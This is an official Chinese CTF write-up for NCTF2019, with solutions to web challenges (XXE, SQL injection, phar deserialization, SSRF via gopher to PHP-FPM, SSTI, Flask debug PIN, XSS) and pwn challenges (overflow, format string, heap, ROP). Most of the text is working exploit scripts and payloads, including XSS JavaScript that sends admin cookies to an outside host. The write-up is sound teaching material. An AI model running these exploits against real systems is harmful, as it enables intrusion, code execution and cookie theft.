NCTF2019-官方writeup
===

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01b7e38256954e8993.png)

## WEB
### Fake XML cookbook[52pt 184solvers]
```
==Difficulty: easy==

flag is in /flag

==Author zjy==
```

* 从题目中的XML，结合抓到的包中显示的完整的XML代码，以及后台XML格式的回显，应该在网上简略搜索便能查到XXE的基本利用方法，这里贴一篇讲XXE的[文章](https://xz.aliyun.com/t/3357)
* 题目借用XXE-LAB源码，已与师傅打过招呼
* exp.py

```python
import requests
url = "http://127.0.0.1/php_xxe/doLogin.php"

payload = '''<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY foo SYSTEM "file:///flag">]>
<user><username>&foo;</username><password>0</password></user>
'''

r = requests.post(url,data=payload,headers={'Content-Type':'text/xml'})
print r.text
```

### True XML cookbook[294pt 25solvers]

```
==Difficulty: medium==

try to use XML to do more things

==Author zjy==
```

* XXE除了基本的读文件，还有很多用法，比如探测、攻击内网。能与其他一些漏洞结合起来使用。
* 读取`/etc/hosts`与`/proc/net/arp`推得内网存活主机ip为`192.168.1.8`

```python
import requests
url = "http://127.0.0.1/php_xxe/doLogin.php"

payload = '''<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY foo SYSTEM "http://192.168.1.8/">]>
<user><username>&foo;</username><password>0</password></user>
'''

r = requests.post(url,data=payload,headers={'Content-Type':'text/xml'})
print r.text
```

### SQLi[500pt 11solvers]

```
==Difficulty: difficult==

admin write something to fight against spider

==Author zjy==
```

* 这道题ban掉`'`以及注释方法(如`#` `--`)，使得常见的方法对于最后的passwd的闭合都无效了
* payload

```
username=\
passwd=||(passwd/**/regexp/**/"^xxxxx")%00
```

```python
#!/usr/bin/env python
import requests

url = "http://ip/index.php"
string="1234567890qwertyuiopasdfghjklzxcvbnm_"
password = ""

for i in range(1,100):
    for a in string:
        data = {
            "username" : "\\",
            "passwd" : "||(passwd/**/regexp/**/\"^{}\");".format(password+a)+chr(0)
        } 
        r = requests.post(url,data=data)
        if "friend" in r.text:
            password+=a
            print password
            break
```

### phar matches everything[714pt 5solvers]

```
==Difficulty: difficult==

I hate VIM.

hint: they are very close

==Author zjy==
```

* 通过题目描述意识到vim的swp恢复，从而得到catchmime.php的源码。
* 这个catchmime.php的源码极其诡异，多了两个莫名其妙的类。
    * 其实一个考察protected与public序列化之后的差异
    * 另一个就是考察考烂了的phar反序列化特性
* 明确攻击方法之后，通过观察网站基本功能来确定调用方式
* 首先就是图片伪造，比如，在文件头部填充`GIF89a`以此来伪装成GIF文件，来绕过`getimagesize`类似函数的检查
* 尝试构造一个满足上述要求并且能够读取`/etc/passwd`的phar文件

```php
<?php
class Easytest{
    protected $test="1";
    public function funny_get(){
        return $this->test;
    }
}
class Main {
    public $url="file:///etc/passwd";
    public function curl($url){
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        $output=curl_exec($ch);
        curl_close($ch);
        return $output;
    }

	public function __destruct(){
        $this_is_a_easy_test=unserialize($_GET['careful']);
        if($this_is_a_easy_test->funny_get() === '1'){
            echo $this->curl($this->url);
        }
    }    
}
@unlink('phar.phar');
$obj = new Main;
$p = new Phar('phar.phar', 0);
$p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$p->setMetadata($obj);
$p->addFromString('test.txt','test');
$p->stopBuffering();

echo urlencode(new Easytest);
```

* 将生成的phar文件后缀改为图片后缀比如`gif`，成功上传后，在获取文件类型的时候构造特殊文件名
```
phar://uploads/xxxxxxxxxx.gif
```
* 同时GET传参`careful`,值为上面脚本的输出值（Easytest的序列化结果），此时即可触发反序列化
* 又是打内网，套娃题
* 基本流程读文件，得知内网ip后，更改上面脚本的url参数，根据提示去探测其周边主机。

```
本机ip 10.0.0.2

尝试后

内网存活主机ip 10.0.0.2
```

* 又到了gopher打PHP-FPM时间
* 下面为用于生成攻击PHP-FPM的TCP数据流的脚本

```python
import socket
import random
import argparse
import sys
from io import BytesIO
import base64
import urllib

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''

            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            print('connect failure! please check your fasctcgi-server !!')
            return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        self.sock.send(request)
        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId]['response'] = b''
        return self.__waitForResponse(requestId)

    def gopher(self, nameValuePairs={}, post=''):

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
        return request

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
    parser.add_argument('host', help='Target host, such as 127.0.0.1')
    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php echo "PWNed";?>')
    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)
    parser.add_argument('-e', '--ext', help='ext absolute path', default='')
    parser.add_argument('-if', '--include_file', help='evil.php absolute path', default='')
    parser.add_argument('-u', '--url_format', help='generate gopher stream in url format', nargs='?',const=1)
    parser.add_argument('-b', '--base64_format', help='generate gopher stream in base64 format', nargs='?',const=1)


    args = parser.parse_args()

    client = FastCGIClient(args.host, args.port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = args.file
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(args.code),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }

    if args.ext and args.include_file:
        #params['PHP_ADMIN_VALUE']='extension = '+args.ext
        params['PHP_ADMIN_VALUE']="extension_dir = /var/www/html\nextension = ant.so"
        params['PHP_VALUE']='auto_prepend_file = '+args.include_file
    if not args.url_format and not args.base64_format :
        response = client.request(params, args.code)
        print(force_text(response))
    else:
        response = client.gopher(params, args.code)
        if args.url_format:
            print(urllib.quote(response))
        if args.base64_format:
            print(base64.b64encode(response))
```

* 使用方式

```
python exp.py 1.1.1.1 /var/www/html/index.php -p 9000 -c "<?php phpinfo(); ?>" -u

效果

%01%01%9C%F3%00%08%00%00%00%01%00%00%00%00%00%00%01%04%9C%F3%01%DB%00%00%0E%02CONTENT_LENGTH19%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%9C%F3%00%00%00%00%01%05%9C%F3%00%13%00%00%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%01%05%9C%F3%00%00%00%00
```

* 结合ssrf基本姿势来更改第一个脚本的url参数

```php
<?php
	class Main {
    		public $url="gopher://10.0.0.3/_%01%01%9C%F3%00%08%00%00%00%01%00%00%00%00%00%00%01%04%9C%F3%01%DB%00%00%0E%02CONTENT_LENGTH19%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%9C%F3%00%00%00%00%01%05%9C%F3%00%13%00%00%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%01%05%9C%F3%00%00%00%00";
}
	@unlink('phar.phar');
	$obj = new Main;
	$p = new Phar('phar.phar', 0);
	$p->startBuffering();
	$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
	$p->setMetadata($obj);
	$p->addFromString('test.txt','test');
	$p->stopBuffering();
```

* 拿到phpinfo之后也就到了最后一关`bypass open_basedir`
* 给出对应payload

```
mkdir('yl');chdir('yl');ini_set('open_basedir','..');chdir('..');chdir('..');ch dir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
```

### easyphp[169pt 50solvers]
```
==Difficulty: easy==

easyphp come on :)

==Author L3mory==
```

笨比出题人先来挨打QWQ，这一题的第三关中，把等于写成了不等于。

![](https://ps.ssl.qhmsg.com/t014bf8941f17ea570e.png)

下面说一下解题思路

* 第一关，换行符绕过正则匹配
* 第二关，考查php的弱类型。要求输入两个字符串的md5不相等，然后分别将'c','x','h','p'替换为0，1，2，3，替换过后值相等，则过关。不过md5的值中根本就不会出现'x','h','p’。所以如果将一个字符串md5值中的所有字母'c'替换成0还能满足  0exxxxxxxxxxxx（x为数字） 这种类型的话，那么这个值就符合要求。另一个值去网上随便找一个md5后是0exxxx类型的就行，最好python脚本如下，很快就能跑出来。

```python
import hashlib

def makemd5(s):
	return hashlib.md5(s.encode('utf-8')).hexdigest()

s = '0123456789c'

for i in range(10000000):
	md5 = makemd5(str(i))
	if md5[0:2] == 'ce' or md5[0:2] == '0e':
		if all(map(lambda x: x in s, md5[2:])):
			print(str(i)+"   "+md5)
			break		
```

* 第三关，用Q+W+Q来绕过，参考网址：https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/ ，绕过之后就很好get flag了，方式很多随便举一个  `ca\t *`

最终payload：
```
http://139.129.76.65:60005/?num=23333%0A&str1=2120624&str2=QNKCDZO&q.w.q=ca\t%20*
```

### replace[172pt 49solvers]
```
==Difficulty: medium==

简单的单词替换工具

==Author gap==

```

在hint.php中给出了提示使用的php版本为5.6也就是preg_replace还未彻底被废除前的版本，根据题目所给出的案例和名字也可以联想到内部使用了preg_replace函数。
我们都知道preg_replace函数在正则匹配中开启/e模式时会导致任意命令执行的问题

> 学习资料 https://www.secpulse.com/archives/74839.html

本题当中直接执行phpinfo()是可以的，但在命令执行的`$rep`处禁用了一系列常用的命令执行函数和特殊的符号(system.exec,passthru,assert,单双引号和反引号)。
此处我们用到的绕过方法也是一个常见的命令执行绕过方法，利用传入变量的方法进行绕过。也就是说我们的参数rep为`$_POST[a]($_POST[b])`，随后再以POST的方式传入a和b即可完成对参数过滤的绕过。

![](https://ps.ssl.qhmsg.com/t01df0133f8e845fe6b.png)

### flask[101pt 90solvers]
```
==Difficulty: medium==

方便快捷的加密网站

==Author gap==
```

一个用flask编写的简单的加密网站，利用的漏洞点也十分明了，在404页面实现的ssti，常规操作结束后会发现不能直接读取flag，此时可以通过拼接参数或者通配符的方式对flag进行读取

```
{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('cat /f'+'lag').read()}}
```

### Upload your Shell[125pt 71solvers]
```
==Difficulty: easy+==

骚年，找到上传点，然后用你的骚操作去拿到FLAG!

==Author Iuhrey==
```

* 本题的考点很简单，就是文件包含去解析上传的图片马
* 图片马有几个waf需要绕过
* 文件头检测
* Content-type检测
* 文件内容不能有&lt;\?
* 综合上传一个图片马内容为如下的即可
* `GIF89a`即可
* 使用文件包含就能得到flag


### flask_website[476pt 12solvers]
```
==Difficulty: medium==

flask is interesting :)

==Author L3mory==
```

* 考flask的pin，当flask的debug模式开启的时候，只要输入正确的pin就能执行python命令。
* 详情请看这篇文章：https://xz.aliyun.com/t/2553
* 题目中可以直接file协议读所需要的内容，页面最下面的 x1c@admin.com ，点击即可进入debug界面
* 不过这边需要稍作修改，flask源码里面写了，当环境为docker的时候，machine id的值从 /proc/self/cgroup 中获取，不少师傅没读源码，在这里踩了个坑（不读源码还想得flag，手动狗头）
* 最终脚本如下(脚本用的kingkk师傅文章里的，稍作了修改)

``` python
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf',# username
    'flask.app',# modname
    'Flask',#getattr(app, "__name__", app.__class__.__name__)
    '/usr/local/lib/python3.6/site-packages/flask/app.py' #getattr(mod, "__file__", None)
]

private_bits = [
    '2485377957890',#/sys/class/net/eth0/address
    '6d10f4205af882b0f39e21c1ef0fb2d454004ad9f9eae59513b6789e9f492bf4' #/proc/self/cgroup
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

```

* 进入之后执行python命令

`print([x for x in os.listdir('/')])`
`print(open('flagggggggggg.txt').read())`

ps:环境每10分钟重启一次，所以machine id是不同的

### simple_xss[222pt 36solvers]
```
==Difficulty: easy+==

一个简陋的登录注册留言系统

==Author chenxiyuan==
```

简单的xss，没有任何过滤，不过实际测试时双引号会被过滤，在留言处插入`alert('xss')`弹窗成功，接下来就是打admin的cookie，可以选择xss平台也可以自己写，这里选择cchan的payload供大家参考.
```html
<script src=//xxx.xxx.xxx.xxx/cookie.js></script>
```

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://xxx.xxx.xxx.xxx/cookie.php?' + document.cookie);
xhr.send();
```

```php
<?php
header('Access-Control-Allow-Origin: *');
file_put_contents('cookie.txt', $_SERVER['QUERY_STRING']."\n", FILE_APPEND);
```

出题时没考虑到搅屎，admin被插入跳转后，后面的就渲染不出来了，不得不重置数据库。还有一点是为了区分用户和admin bot，我写了`$_SERVER['HTTP_REFERER']`，有跳转的视为正常用户进入home.php,然后无跳转且cookie为admin就直接输出flag,所以如果大家直接进入admin的界面，需要把referer清空。

### hacker_backdoor[182pt 46solvers]
```
==Difficulty: easy==

hacker留下的后门，你能利用么 :)

==Author L3mory==
```

* 考察命令执行，虽然禁掉了内置函数，但是仍然可以通过字符拼接来进行命令执行。不过disable_functions里面也禁用了一些函数，所以有些函数就算是通过拼接，也无法直接执行。
* 本题稍微模改了一下2019inctf的题目（已向SpyD3R师傅打过招呼）
* payload：`http://139.129.76.65:60004/?code=$x=(ch).(r);$k=$x(95);$l=$x(47);$a=(pr).(oc).$k.(op).(en);$b=($l.readflag);$c=(p).(i).(pe);$d=r;$e=w;$f=(p).(i).(pes);$g=(pri).(nt).$k.(r);$h=(str).(eam).$k.(ge).(t).$k.(con).(tents);$i=(arra).(y).$k.(sh).(ift);$j=(arra).(y).$k.(sl).(ice);$z=$a($b,array(array($c,$d),array($c,$e),array($c,$e)),$$f);$g($h($i($j($$f,1,2))));&amp;useful=/etc`


## PWN
出题前密码跟逆向已经出的差不多了，听他们说出难了。。。为了防止萌新自闭只能下调pwn难度了

### hello_pwn[55pt 173solvers]

```
==Difficulty: easy==

Do you know pwntools? nc 139.129.76.65 50003

==Author Trigger==
```

很简单的一个签到，用用退格导致了直接nc上去看不到flag，但是pwntools的接收是可以接收到的。

```python

from pwn import *
#r=process('./hello_pwn')
r=remote('0.0.0.0',10000)
r.interactive()
```

### pwn_me_100_years(Ⅰ)[88pt 104solvers]
```
==Difficulty: easy==

pwn me,plz! nc 139.129.76.65 50004

==Author zihu4n==
```

很简单的一个溢出，读取的长度超过了数组存放的大小，外加预设的一个后门的触发的数跟可读入的数组相邻。

```python
from pwn import *
#r=process('./pwn_wo_1')
r=remote('0.0.0.0',10001)
r.recvuntil('are you ready?')
py='yes'
py=py.ljust(16,'\x00')
py+=p64(0x66666666)
r.sendline(py)
r.interactive()
```

### pwn_me_100_years(Ⅱ)[192pt 43solvers]

```
==Difficulty: easy==

pwn me,again,plz! nc 139.129.76.65 50005

==Author zihu4n==
```

简单的格式化字符串，算好偏移直接修改成0x66666666就可以了。
不过这题看见了非预期，因为我的检查是不是0x66666666跟格式化字符串的漏洞函数在的地方不一样，所以其实可以修改函数返回地址到call backdoor那个地方直接getshell。

```python
from pwn import *
r = remote('139.129.76.65', 50005)
#r=process('./pwn_me_2')
r.recvuntil('name:\n')
r.sendline('a'*0x10+'%p')
r.recvuntil('0x') # preparing......\n
to = r.recvuntil('\n')[:-1]
to = int(to, 16) - 0x202080 + 0x2020E0
r.recvuntil('want?\n')
py='%26214c%9$hn%10$hn'
py=py.ljust(0x18,'\x00')
py+=p64(to)+p64(to+2)
r.sendline(py)
r.interactive()
```

### pwn_me_100_years(3)[312pt 23solvers]

```
==Difficulty: medium==

pwn me,plz!23333 nc 139.129.76.65 50006

==Author zihu4n==
```

简单的unlink题，不过edit那边有溢出，也可以当成fastbin attack来写。

```python
from pwn import *
#r=process('./pwn_me_3')
r=remote('0.0.0.0',10003)
def add(size,content):
	r.sendlineafter('5,exit','1')
	r.sendlineafter('size',str(size))
	r.sendafter('content',content)

def free(idx):
	r.sendlineafter('5,exit','2')
	r.sendlineafter('idx',str(idx))

def view(idx):
	r.sendlineafter('5,exit','3')
	r.sendlineafter('idx',str(idx))

def edit(idx,content):
	r.sendlineafter('5,exit','4')
	r.sendlineafter('idx',str(idx))
	r.send(content)
def gd():
	gdb.attach(r)
	pause()

add(0x20,'aaaa')#0
add(0x20,'aaaa')#1
add(0x80,'bbbb')#2
add(0xf0,'bbbb')#3
add(0x20,'aaaa')
free(0)
free(1)
add(0x20,'a')#0
view(0)
r.recvline()
leak=u64(r.recv(3).ljust(8,'\x00'))
print hex(leak)
to_fake=leak-0x61+0x10
print hex(to_fake)
free(2)
fake=0x6020e8
add(0x88,p64(0)+p64(0x81)+p64(fake-0x18)+p64(fake-0x10)+p64(0)*10+p64(0)+p64(0)+p64(0x80))
free(3)
edit(1,p64(0)*2+p64(to_fake)+'\n')
edit(0,p64(0x66666666))
r.interactive()
```

### warm_up[333pt 21solvers]

```
==Difficulty: medium++==

time to warm_up nc 139.129.76.65 50007

==Author zihu4n==
```

简单的seccomp，过滤了execve，所以可以memportect给权限后自己写汇编来搞orw，这边我是选择了通过libc gadget的方法来写orw。
本来想出prctl来考prctl的改写的，后来想了想还是降难度吧。

```python
from pwn import *
#r=process("./warm_up")
r=remote('0.0.0.0',10004)
def leak(len):
	r.recvuntil('warm up!!!')
	r.send('a'*len+'b')
	r.recvuntil('aaaab')

def gd():
	gdb.attach(r)
	pause()

leak(0x18)
canary=u64('\x00'+r.recv(7))
print hex(canary)
lea=0x0000000000400AB6
py_1='a'*0x18+p64(canary)+p64(lea)+p64(lea)
r.sendline(py_1)
libc=ELF("./libc-2.23.so")
leak(0x2f)
libc_base=u64(r.recv(6).ljust(8,'\x00'))-240-libc.symbols['__libc_start_main']
print hex(libc_base)
pd=0x0000000000021102+libc_base
ps=0x00000000000202e8+libc_base
pb=0x000000000002a69a+libc_base
read_got=libc_base+libc.symbols['read']
write_got=libc_base+libc.symbols['write']
open_got=libc_base+libc.symbols['open']
syscall=0xF725E+libc_base
pa=libc_base+0x0000000000033544
elf=ELF('./warm_up')
py_2='a'*0x18+p64(canary)+p64(canary)+p64(lea)
r.sendline(py_2)
leak(0x3f-8)
stack=u64(r.recv(6).ljust(8,'\x00'))
print hex(stack)
fake=stack-0x4b8+0x3b0
py_3='./flag\x00\x00'+'a'*0x10+p64(canary)*2
py_3+=p64(pd)+p64(fake)+p64(ps)+p64(0)+p64(pb)+p64(0)+p64(open_got)
py_3+=p64(pd)+p64(3)+p64(ps)+p64(elf.bss()+0x100)+p64(pb)+p64(0x100)+p64(read_got)
py_3+=p64(pd)+p64(1)+p64(ps)+p64(elf.bss()+0x100)+p64(pb)+p64(0x100)+p64(write_got)
r.sendline(py_3)
r.interactive()
```

### easy_rop[588pt 8solvers]
```
==Difficulty: medium++==

rop rop rop!!! nc 139.129.76.65 50002

==Author w4rd3n==
```

再次感谢su的w4rd3n师傅的支援，简单的栈迁移。
`scanf("%d")`输入+，-不会改变原来栈上内容，可以根据这个来leak
最后讲栈迁移到我们可以输入的bss段中，写gadget来leak+getshell

```python
from pwn import *

def leak():
    r.recvuntil(": ")
    r.sendline("+")
    r.recvuntil(" = ")
    data1 = int(r.recvline())
    if data1 < 0:
        data1 = data1 + 0x100000000

    r.recvuntil(": ")
    r.sendline("+")
    r.recvuntil(" = ")
    data2 = int(r.recvline())
    if data2 < 0:
        data2 = data1 + 0x100000000

    return data2 * 0x100000000 + data1

def set(val):
    r.recvuntil(": ")
    r.sendline(str(val % 0x100000000))

    r.recvuntil(": ")
    r.sendline(str(val / 0x100000000))

#r = process("./easy_rop")
r=remote("0.0.0.0",9999)
leak_list = []

for i in range(15):
    leak_list.append(leak())
    print hex(leak_list[i])

pie = leak_list[14] - 0x5570b84d6b40 + 0x5570b84d6000

set(pie + 0xb9d)
set(pie + 0x201408)

r.recvuntil("What's your name?\n")
payload = p64(pie + 0xba3) + p64(1) + p64(pie + 0xba1) + p64(pie + 0x201238) + p64(0) + p64(pie + 0x820)
payload += p64(pie + 0xba3) + p64(0) + p64(pie + 0xba1) + p64(pie + 0x201238) + p64(0) + p64(pie + 0x850)
payload += p64(pie + 0x810)
r.send(payload)

libc = u64(r.recv(8)) + 0x7fd4b593c000 - 0x7fd4b59ab690

r.send(p64(libc + 0x4526a))

print "pie:  " + hex(pie)
print "libc: " + hex(libc)

r.interactive()
```

### easy_heap[500pt 11solvers]
```
==Difficulty: medium++==

heap heap heap!!! nc 139.129.76.65 50001

==Author w4rd3n==
```

感谢su的w4rd3n师傅的支援，简单的fastbin attack。
程序存在uaf漏洞，在开始输入名字的时候是存在一个伪造fastbin头部的机会，修改完设计的最大申请大小后就是常见的fastbin attack

```python
from pwn import *

def add(size, content):
    r.sendline("1")
    r.sendlineafter("What's your heap_size?\n", str(size))
    r.sendafter("What's your heap_content?\n", content)
    r.recvuntil("4. exit\n")

def dele(index):
    r.sendline("2")
    r.sendlineafter("What's your heap_index?\n", str(index))
    r.recvuntil("4. exit\n")

def show(index):
    r.sendline("3")
    r.sendlineafter("What's your heap_index?\n", str(index))
    r.recvuntil(": ")
    data = r.recvline()[:-1]
